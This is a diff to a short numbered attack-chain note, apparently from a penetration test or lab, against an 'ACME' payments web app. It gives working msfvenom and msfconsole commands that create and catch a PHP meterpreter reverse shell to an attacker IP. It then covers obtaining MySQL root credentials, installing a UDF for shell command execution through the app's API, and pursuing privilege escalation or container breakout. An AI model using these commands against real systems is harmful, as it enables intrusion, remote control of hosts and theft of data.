@@ -1,5 +1,5 @@
 1. Vulnerable entrypoint into stack is via /api/?action=
-2. msfvenom -p php/meterpreter/reverse_tcp LHOST=${MYIP} -e php/base64 -f raw  >> images.php
+2. msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.83.235 -e php/base64 -f raw > /tmp/payload.php
 3. stage this onto ACME webapp
 4. msfconsole; use multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST $MYIP; exploit;
 5. in another window use curl or a browser to land on the uploaded msfvenom staged payload
@@ -9,7 +9,7 @@
 9. root user password is now known, through the portfwd login to MySQL using the root credentials; now we have the needed access to install the UDF for shell execution.
 10. So the data flow is now, http://acmepayments.com/api/?action=sys_eval($cmd) -> MySQL service execute $cmd as MySQLuser on host -> return result
 11. shell commands in the MySQL procotol, communicted through PHP through HTTP protocol, back to the adversary.
-12. next steps (intelleigent) may be to further serivce / host priv escalate or breakout the containers, $greedy opportunists instead opt for noisy operations which ultimately gets them caught.
+12. next steps may be to further serivce / host priv escalate or breakout the containers, $greedy opportunists instead opt for noisy operations which ultimately gets them caught.
 
  
 
